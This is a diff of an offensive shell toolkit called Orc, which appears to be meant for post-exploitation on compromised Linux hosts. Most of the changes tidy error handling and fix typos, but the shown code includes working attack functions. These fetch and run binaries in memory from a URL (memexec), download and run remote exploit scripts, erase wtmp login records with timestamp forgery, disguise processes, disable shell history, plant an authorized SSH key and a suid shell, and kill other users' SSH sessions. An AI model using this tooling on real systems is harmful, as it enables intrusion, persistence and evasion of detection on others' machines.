@@ -6,7 +6,7 @@ OVERSION="0.6"
 
 # ~~~ Compatibility Layer ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 #
-# In the compatiblity layer the functions to handle the differences
+# In the compatibility layer the functions to handle the differences
 # between different Unix flavors, shell types are collected.
 # Functions outside the compatibility layer call functions in this
 # layer or call tools/programs common for all Unix flavors.
@@ -18,7 +18,7 @@ orc_existsProg () {
   # Argument: Program/command name to check.
   # Exit status: 0 if one ore more programs do not exists.
   if [ $# -lt 1 ]; then
-    echo 'Error: missing program name to check.'
+    echo 'Error: missing program name to check' >&2
     return 1;
   fi
   hash "$@" > /dev/null 2> /dev/null
@@ -31,7 +31,7 @@ orc_loadURL () {
   # Output to stdout: The content of the URL document.
   # Global: http(s)_proxy variables will be used.
   if [ $# -ne 1 ]; then
-    echo 'Error: argument must be one URL to load'
+    echo 'Error: argument must be one URL to load' >&2
     return 1
   fi
   # A proxy could be set via environment variables to the tools.
@@ -42,7 +42,7 @@ orc_loadURL () {
   export HTTP_PROXY
   if [ -n "$http_proxy" ]; then
     if [ -n "$HTTP_PROXY" ] && [ "$HTTP_PROXY" != "$http_proxy" ]; then
-      echo 'Warning, ignore HTTP_PROXY value and use http_proxy value.'
+      echo 'Warning: ignore HTTP_PROXY value and use http_proxy value' >&2
     fi
     HTTP_PROXY=$http_proxy
   elif [ -n "$HTTP_PROXY" ]; then
@@ -52,7 +52,7 @@ orc_loadURL () {
   export HTTPS_PROXY
   if [ -n "$https_proxy" ]; then
     if [ -n "$HTTPS_PROXY" ] && [ "$HTTPS_PROXY" != "$https_proxy" ]; then
-      echo 'Warning, ignore HTTPS_PROXY value and use https_proxy value.'
+      echo 'Warning: ignore HTTPS_PROXY value and use https_proxy value' >&2
     fi
     HTTPS_PROXY=$https_proxy
   elif [ -n "$HTTPS_PROXY" ]; then
@@ -76,7 +76,7 @@ request = urllib2.urlopen(sys.argv[1])
 sys.stdout.write(request.read())
     ' "$1"
   else
-    echo 'Error: no download tool found'
+    echo 'Error: no download tool found' >&2
     return 1
   fi
 }
@@ -85,9 +85,9 @@ orc_tryTcpConnection () {
   # Try to open a TCP connection to given host and port.
   # Argument: host name or host IP address
   #           TCP port number
-  # Return: 0 if and ony if TCP connection could be opened
+  # Return: 0 if and only if TCP connection could be opened
   if [ $# -ne 2 ]; then
-    echo 'Error: need host and TCP port as arguments'
+    echo 'Error: need host and TCP port as arguments' >&2
     return 1
   fi
   if orc_existsProg bash; then
@@ -127,7 +127,7 @@ sys.exit(0)
     # This is a bash extension. POSIX shell will not support this.
     bash -c "echo '' > /dev/tcp/$1/$2" 2>/dev/null
   else
-    echo 'Error: no tool to open TCP connection found'
+    echo 'Error: no tool to open TCP connection found' >&2
     return 1
   fi
 }
@@ -135,7 +135,7 @@ sys.exit(0)
 
 orc_listtmp() {
   # List tmpfs directories with access information.
-  # Search in the list of tmpfs filesystems and in a list of common
+  # Search in the list of tmpfs filesystem and in a list of common
   # file destinations.
   # Use simple df call to keep script compatible to the most systems.
   # -l, -t, --output is not available on some systems, e.g. busybox.
@@ -189,7 +189,7 @@ orc_makeHome() {
     fi
   done
   # no good home directory found. Use /dev/shm/.q as error fallback
-  echo 'Warning, found no good home directory, some functions may fail'
+  echo 'Warning: found no good home directory, some functions may fail' >&2
   HOME="/dev/shm/.q"
   mkdir $HOME 2>/dev/null
   }
@@ -203,11 +203,11 @@ orc_archive () {
   # Return:    0 if and only if archive file creation was ok.
   # Globals:   Set ORC_ARCHIV_FILE to the name of the created file.
   if [ $# -ne 2 ]; then
-    echo 'archiver needs two arguments'
+    echo 'Error: archiver needs two arguments' >&2
     return 1
   fi
   if [ ! -d "$2" ] || [ ! -r "$2" ]; then
-    echo "Error, archiver can not read $2"
+    echo "Error: archiver can not read $2" >&2
     return 1
   fi
   # Now no archive file exists. Reset any old content.
@@ -233,7 +233,7 @@ orc_archive () {
     zip -9Xrq "$1.zip" "$2" && ORC_ARCHIVE_FILE="$1.zip"
   fi
   if [ -z "$ORC_ARCHIVE_FILE" ]; then
-    echo 'Error, no working archive tool found'
+    echo 'Error: no working archive tool found' >&2
     return 1
   fi
 }
@@ -264,7 +264,7 @@ alias 'echo'='/bin/echo'
 # Create home directory and prepare remove at script exit
 orc_makeHome
 if [ ! -d "$HOME" ]; then
-  echo 'ERROR: can not find a home directory.'
+  echo 'Error: can not find a home directory' >&2
   exit 1
 fi
 trap 'rm -rf $HOME' EXIT TERM INT
@@ -287,7 +287,7 @@ if [ -r "$ENV" ]; then
   ENV=$(realpath "$ENV")
 fi
 if [ -z "$backup" ]; then
-  echo 'Warning, backup variable with script file is not available'
+  echo 'Warning: backup variable with script file is not available' >&2
 fi
 NHOME=""
 
@@ -297,18 +297,18 @@ orc_createEchoFile () {
   # Argument: Text to echo.
   # Global: set $ORC_ECHO_FILE to the created file.
   if [ $# -lt 1 ]; then
-    echo 'Error: missing text to echo.'
+    echo 'Error: missing text to echo' >&2
     return 1
   fi
   if [ "$HOME" = "" ]; then
-    echo 'Error, HOME variable is empty'
+    echo 'Error: HOME variable is empty' >&2
     return 1
   fi
   # Create the script file in the prepared HOME directory
   ORC_ECHO_FILE="$HOME/.c"
   echo '#!/bin/sh' > "$ORC_ECHO_FILE"
   if [ ! -r "$ORC_ECHO_FILE" ]; then
-    echo 'Error, can not create echo file'
+    echo 'Error: can not create echo file' >&2
     return 1
   fi
   # Limit access to the owner
@@ -325,14 +325,14 @@ orc_httpsProxyReminder() {
   # Output to stdout: Reminder.
   # Global: https_proxy variable is checked.
   if [ $# -ne 1 ]; then
-    echo 'Error: missing host name'
+    echo 'Error: missing host name' >&2
     return 1
   fi
   if [ -z "$https_proxy" ] && [ -z "$HTTPS_PROXY" ]; then
     # no proxy is defined.
     if ! orc_tryTcpConnection "$1" 443; then
       # no connection and no proxy: remind
-      echo 'Info: connection problem, https_proxy could be needed'
+      echo 'Info: connection problem, https_proxy could be needed' >&2
       return 2
     fi
   fi
@@ -348,18 +348,18 @@ orc_log2outp() {
   #          pipes stderr into $OUTP/basename.err
   #          logs basename and command call in $OUTP/log.txt
   if [ ! -d "$OUTP" ]; then
-    echo 'output directory not defined or prepared'
+    echo 'Error: output directory not defined or prepared' >&2
     return 1
   fi
   if [ $# -lt 1 ]; then
-    echo 'missing basename of the output files'
+    echo 'Error: missing basename of the output files' >&2
     return 1
   fi
   echo "$@" >> "$OUTP/log.txt"
   basename=$1
   shift
   if [ $# -lt 1 ]; then
-    echo 'missing command to execute'
+    echo 'Error: missing command to execute' >&2
     return 1
   fi
   "$@" >> "$OUTP/$basename.txt" 2>> "$OUTP/$basename.err"
@@ -381,7 +381,7 @@ orc_home_of_userid () {
   # Argument: ID of the user.
   # Output to stdout: home directory
   if [ $# -ne 1 ]; then
-    echo 'argument user-id must be given'
+    echo 'Error: argument user-id must be given' >&2
     return 1
   fi
   getent passwd |
@@ -463,7 +463,7 @@ getinfo() {
   orc_log2outp mount mount
   orc_log2outp df df
   orc_log2outp user_crontab crontab -l
-  if hash ifconfig 2>/dev/null; then
+  if orc_existsProg ifconfig; then
     orc_log2outp ifconfig ifconfig -a
   else
     orc_log2outp ifconfig ip link
@@ -497,7 +497,7 @@ getinfo() {
     # Remove the single log files. Keep only the archive file.
     rm -rf "$OUTP"
   else
-    echo "Error, can not archive, the files are in $OUTP"
+    echo "Error: can not archive, the files are in $OUTP" >&2
   fi
 }
 
@@ -521,13 +521,13 @@ getuservices() {
 }
 
 getluks() {
-if hash lsblk 2>/dev/null; then
+if orc_existsProg lsblk; then
 	if lsblk -al | awk '{print $6}' | grep -q "crypt"; then
 	echo "Encrypted partition detected. Run lsblk to see more."
 	fi
-elif hash dmesg 2>/dev/null; then
+elif orc_existsProg dmesg; then
 	if dmesg -T | grep -i Boot_image | grep -qi "rd.luks.uuid"; then
-	echo "Encrypted partition detected. No lsblk found. Investigate manuallt."
+	echo "Encrypted partition detected. No lsblk found. Investigate manual."
 	fi
 fi
 }
@@ -560,9 +560,25 @@ getidle() {
   # reminder: do not use gawk functions, e.g. systime
 }
 
+
 srm() {
-shred -vzfun 2 "$1"
+  # secure shredding of files
+  # Argument: file(s) to overwrite and to remove.
+  if [ $# -lt 1 ]; then
+    echo 'Error: srm needs a file name(s) as argument' >&2
+    return 1
+  fi
+  if orc_existsProg shred; then
+    shred -vzfun 2 "$@"
+  else
+    echo 'Warning: no file overwrite, only delete' >&2
+    # TODO: implement overwrite of file content and file name
+    # "--force" is not used because the long format is not accepted
+    # by all shells, e.g. busybox shell.
+    rm -f -- "$@"
+  fi
 }
+
 
 qssh() {
   # ssh without a tty - qssh [password] [normal arguments]
@@ -570,7 +586,7 @@ qssh() {
   #            arguments feed through to the ssh
   # Method: Creates a shell script file which echoes the password.
   if [ $# -lt 2 ]; then
-    echo 'Error, qssh needs at least password and command as arguments'
+    echo 'Error: qssh needs at least password and command as arguments' >&2
     return 1
   fi
   if tty | grep -q "not"; then
@@ -579,7 +595,7 @@ qssh() {
     # shellcheck disable=SC2029
     DISPLAY="" SSH_ASKPASS="$ORC_ECHO_FILE" ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -T "$@"
   else
-    echo "You've got a tty. You can't use qssh."
+    echo 'Error: You have got a tty. You can not use qssh' >&2
   fi
 }
 
@@ -589,7 +605,7 @@ qsu() {
   #            arguments feed through to the sudo
   # Method: Creates a shell script file which echoes the password.
   if [ $# -lt 2 ]; then
-    echo 'Error, qsu needs at least password and command as arguments'
+    echo 'Error: qsu needs at least password and command as arguments' >&2
     return 1
   fi
   orc_createEchoFile "$1"
@@ -599,11 +615,21 @@ qsu() {
 }
 
 memexec() {
-memfile=$(orc_loadURL "$1" | od --endian=big -An -x | tr -d ' ' | tr -d '\n')
-finalmem=$(echo "$memfda" | base64 -d)
-finalmem=${finalmem}$(echo "$memfile/ or die;")
-finalmem=${finalmem}$(echo "$memfdb" | base64 -d)
-echo "$finalmem" | perl
+  # Execute a binary in-memory from webserver.
+  # Argument: URL of the binary, http or https is supported.
+  if [ $# -ne 1 ]; then
+    echo 'Error: memexec needs URL as argument' >&2
+    return 1
+  fi
+  if ! orc_existsProg perl; then
+    echo 'Error: missing perl, can not execute in memory' >&2
+    return 1
+  fi
+  memfile=$(orc_loadURL "$1" | od --endian=big -An -x | tr -d ' ' | tr -d '\n')
+  finalmem=$(echo "$memfda" | base64 -d)
+  finalmem=${finalmem}$(echo "$memfile/ or die;")
+  finalmem=${finalmem}$(echo "$memfdb" | base64 -d)
+  echo "$finalmem" | perl
 }
 
 getpty() {
@@ -612,7 +638,7 @@ SHELL=$(command -v sh)
 if [ -r "$ENV" ]; then
   ENV="$ENV" script -c sh /dev/null
 else
-  echo "ENV not defined. Can not start script."
+  echo 'Error: ENV not defined. Can not start script' >&2
 fi
 }
 
@@ -621,7 +647,7 @@ getsuspect() {
   # ask and ye shall receive
   # this janky, awful shortcut
   if ! orc_existsProg bash; then
-    echo 'Error: bash needed but not found.'
+    echo 'Error: bash needed but not found' >&2
     return 1
   fi
   orc_httpsProxyReminder raw.githubusercontent.com
@@ -636,7 +662,14 @@ echo "$sshkey" >> "$NHOME/.ssh/authorized_keys"
 }
 
 psgrep() {
-ps -weFH | grep "$1" | grep -v grep
+  # process grep
+  # Argument: search pattern.
+  if [ $# -ne 1 ]; then
+    echo 'Error: psgrep needs grep pattern as argument'
+    return 1
+  fi
+  # don't list this process running the grep
+  ps -weFH | grep "$1" | grep -v grep
 }
 
 getescape() {
@@ -677,7 +710,7 @@ portscan() {
   # List ports which allow TCP connections.
   # Argument: Name or IP of the target box.
   if [ $# -ne 1 ]; then
-    echo 'Error, portscan needs one host name or host address'
+    echo 'Error: portscan needs one host name or host address' >&2
     return 1
   fi
   echo "Starting portscan of $1 ..."
@@ -690,7 +723,17 @@ portscan() {
 }
 
 fpssh() {
-ssh-keyscan "$1"
+  # pull ssh remote host public fingerprints
+  # Argument: host name, arguments passed thru to ssh-keyscan
+  if [ $# -lt 1 ]; then
+    echo 'Error: fpssh needs host name as argument' >&2
+    return 1
+  fi
+  if ! orc_existsProg ssh-keyscan; then
+    echo 'Error: no ssh-keyscan program, can not get public keys' >&2
+    return 1
+  fi
+  ssh-keyscan "$@"
 }
 
 getip() {
@@ -700,7 +743,7 @@ printf "HTTP says: "
 	orc_loadURL 'https://whatismyip.akamai.com'
 echo ""
 printf "DNS says: "
-	if hash dig>/dev/null; then
+	if orc_existsProg dig; then
 	dig TXT +short o-o.myaddr.l.google.com @ns1.google.com | tr -d \"
 	echo "(used dig)"
 	else
@@ -711,8 +754,8 @@ printf "DNS says: "
 
 prochide() {
   # Execute a program hiden by a long program name.
-  # arguments: program to execute with optional arguments.
-  # methode  : use the longest command line of the current running
+  # Arguments: program to execute with optional arguments.
+  # Method   : use the longest command line of the current running
   #            processes as name of the program to start.
   LONGARG=$(ps --no-header -wweo cmd | awk 'length(X)<length {X=$0}; END {print X}')
   bash -c "exec -a \"$LONGARG\" $*"
@@ -721,7 +764,7 @@ prochide() {
 getnet() (
 echo "Let's see what we can find on the network..."
 echo "ARP table:"
-	if hash arp 2>/dev/null; then
+	if orc_existsProg arp; then
 	arp -na | grep ether |awk -v FS="(\\\(|\\\))" '{print $2}'
 	else
 	ip neigh show | awk -F " " '{print $1}'
@@ -732,10 +775,18 @@ awk -F ' ' '{print $1}' "$NHOME/.ssh/known_hosts" > "$HOME/kh"
 )
 
 wiper() {
-utmpdump /var/log/wtmp | grep -v "$1" > "$HOME/.l"
-touch -r /var/log/wtmp "$HOME/.l"
-utmpdump -r -o /var/log/wtmp "$HOME/.l"
-touch -r "$HOME/.l" /var/log/wtmp
+  # Removes entries from wtmp
+  # Needs write access to the wtmp file. Typical only root
+  # has write access to the login/logout record file.
+  # Argument: grep pattern to remove
+  if [ $# -ne 1 ]; then
+    echo 'Error: wiper needs grep pattern as argument' >&2
+    return 1
+  fi
+  utmpdump /var/log/wtmp | grep -v "$1" > "$HOME/.l"
+  touch -r /var/log/wtmp "$HOME/.l"
+  utmpdump -r -o /var/log/wtmp "$HOME/.l"
+  touch -r "$HOME/.l" /var/log/wtmp
 }
 
 getrel() {
@@ -748,12 +799,12 @@ getrel() {
 
 hangup() {
   # Terminate someones PTS by killing their SSH process.
-  # arguments: Number(s) of PTS. A single number or a list if numbers
-  #            splitted in the arguments is possible.
-  #            Or "all" to terminate all PTS connected via SSH.
-  #            Or "all other" to terminate all but not our SSH.
+  # arguments: Number(s) of PTS. A single number or a list
+  #            of numbers in the arguments is possible.
+  #            Or keyword "all" to terminate all PTS connected via SSH.
+  #            Or keyword "all other" to terminate all but not our SSH.
   if [ $# -lt 1 ]; then
-    echo 'Error: hangup functions needs argument: ID number of PTS'
+    echo 'Error: hangup functions needs argument: ID number of PTS' >&2
     return 1
   fi
   if [ "$2" = "other" ]; then
@@ -775,13 +826,13 @@ hangup() {
     echo "Terminating $PTS_NAME"
     OWNER=$(stat -c '%U' "/dev/$PTS_NAME")
     if [ "$OWNER" = "" ]; then
-      echo "Something is wrong: can't get the owner of $PTS_NAME"
+      echo "Error: can't get the owner of $PTS_NAME" >&2
       continue
     fi
     echo "Owner of $PTS_NAME is $OWNER"
     SSHD_PID=$(pgrep -a sshd | grep "$PTS_NAME" | cut -d ' ' -f 1)
     if [ "$SSHD_PID" = "" ]; then
-      echo "Something is wrong: can't find SSHD PID of $PTS_NAME"
+      echo "Error: can't find SSHD PID of $PTS_NAME" >&2
       continue
     fi
     echo "SSHD PID is $SSHD_PID"
@@ -809,7 +860,7 @@ getexploit () {
   # need a better way to do this, honestly
   # i'd like to pass the -g argument to the script
   if ! orc_existsProg bash; then
-    echo 'Error: bash needed but not found.'
+    echo 'Error: bash needed but not found' >&2
     return 1
   fi
   orc_httpsProxyReminder raw.githubusercontent.com
@@ -857,38 +908,45 @@ gettmp () {
 
 
 gethelp() {
-echo "A probably non-comprehensive list of functionality in Orc v$OVERSION."
-echo "[*] getenum - get kernel, glibc, and dbus versions"
-echo "[*] getinfo - create a tar.xz of useful command output"
-echo "[*] getrel - attempt to get the OS release file."
-echo "[*] getdocker - check docker socket status, and list images."
-echo "[*] getluks - attempt to detect disk crypto with lsblk or dmesg"
-echo "[*] getip - get external IP from akamai and google (HTTP and DNS)"
-echo "[*] getjail - check if we're in a chroot/VM"
-echo "[*] getsec - check if the big three security MAC programs are around"
-echo "[*] gettmp - list typical directories for tmp files"
-echo "[*] getusers - pull all users with a shell"
-echo "[*] getpty - pop a pty with script"
-echo "[*] getidle - list all ptys and their idle times accurately."
-echo "[*] getnet - attempt to enumerate hosts on the local network with ping"
-echo "[*] getsuspect - pull my suspect tool from github."
-echo "[*] getspec - grab some hardware information."
-echo "[*] getuservices - list all running services with non-user accounts in passwd"
-echo "[*] getescape - attempt to escape chroot via bad privs on the /proc/ filesystem."
-echo "[*] getdbus - list all dbus services."
-echo "[*] getexploit - download and run linux-exploit-suggester"
-echo "[*] memexec - execute a binary in-memory from a webserver - memexec [full URI] (x64 only)"
-echo "[*] portscan - run a portscan against common ports - portscan [host]"
-echo "[*] prochide - run a program with $0 changed to the longest entry in ps - prochide [program + args]"
-echo "[*] srm - alias for secure shredding of files."
-echo "[*] qsu - sudo without a tty - qsu [password] [normal arguments]"
-echo "[*] qssh - ssh without a tty - qssh [password] [normal arguments]"
-echo "[*] wiper - remove entries from wtmp - wiper [string to grep out]"
-echo "[*] fpssh - pull ssh remote host fingerprints - fpssh [host]"
-echo "[*] stomp - alias for touch -r (needs arguments)"
-echo "[*] tools - check for common tools"
-echo "[*] dropsuid - drop tiny suid shell - dropsuid > [file]"
-echo "[*] hangup - terminate someones PTS by killing their SSH process. Very loud, DO NOT USE. - hangup [PTS NUMBER]"
+echo "
+A probably non-comprehensive list of functionality in Orc v$OVERSION.
+[*]      getenum - get kernel, glibc, and dbus versions
+[*]      getinfo - create a tar.xz of useful command output
+[*]       getrel - attempt to get the OS release file.
+[*]    getdocker - check docker socket status, and list images.
+[*]      getluks - attempt to detect disk crypto with lsblk or dmesg
+[*]        getip - get external IP from akamai and google (HTTP and DNS)
+[*]      getjail - check if we're in a chroot/VM
+[*]       getsec - check if the big three security MAC programs are around
+[*]       gettmp - list typical directories for tmp files
+[*]     getusers - pull all users with a shell
+[*]       getpty - pop a pty with script
+[*]      getidle - list all ptys and their idle times accurately.
+[*]       getnet - attempt to enumerate hosts on the local network with ping
+[*]   getsuspect - pull my suspect tool from github
+[*]      getspec - grab some hardware information
+[*] getuservices - list all running services with non-user accounts in passwd
+[*]    getescape - attempt to escape chroot via bad privs
+[*]                on the /proc/ filesystem
+[*]      getdbus - list all dbus services
+[*]   getexploit - download and run linux-exploit-suggester
+[*]      memexec - execute a binary in-memory from a webserver
+[*]              - memexec [full URI] (x64 only)
+[*]     portscan - run a portscan against common ports - portscan [host]
+[*]     prochide - run a program with $0 changed to the longest entry in ps
+[*]              - prochide [program + args]
+[*]          srm - alias for secure shredding of files
+[*]          qsu - sudo without a tty - qsu [password] [normal arguments]
+[*]         qssh - ssh without a tty - qssh [password] [normal arguments]
+[*]        wiper - remove entries from wtmp - wiper [string to grep out]
+[*]        fpssh - pull ssh remote host fingerprints - fpssh [host]
+[*]        stomp - alias for touch -r (needs arguments)
+[*]        tools - check for common tools
+[*]     dropsuid - drop tiny suid shell - dropsuid > [file]
+[*]      hangup  - terminate someones PTS by killing their SSH process.
+[*]                Very loud, DO NOT USE.
+[*]              - hangup [PTS NUMBER]
+"
 }
 
 # exit if home directory access is not possible
@@ -914,12 +972,12 @@ alias 'mysql'='MYSQL_HISTFILE=/dev/null mysql'
 unset HISTFILE
 HISTSIZE=0
 umask 002
-if hash ulimit 2>/dev/null; then
+if orc_existsProg ulimit; then
         echo "coredumps disabled by ulimit"
 	#disabling shellcheck here, we're doing our best
         # shellcheck disable=SC2039
 	ulimit -c 0
-elif  hash limit 2>/dev/null; then
+elif orc_existsProg limit; then
         echo "coredumps disabled by limit"
         limit coredumpsize 0
 else echo "no limit/ulimit - coredumps left enabled, careful"
@@ -930,7 +988,7 @@ echo "=========== Info ==========="
 echo "Short kernel info: "
 uname -rni
 echo "IP address on the network: "
-	if hash ifconfig 2>/dev/null; then
+	if orc_existsProg ifconfig; then
 	ifconfig | grep inet | grep -v inet6 | awk -F " " '{ print $2 }' | grep -v 127 | grep -v "::1$"
 	else
 	ip addr show | grep inet | grep -v inet6 | awk -F " " '{ print $2 }' | grep -v 127 | grep -v "::1$"
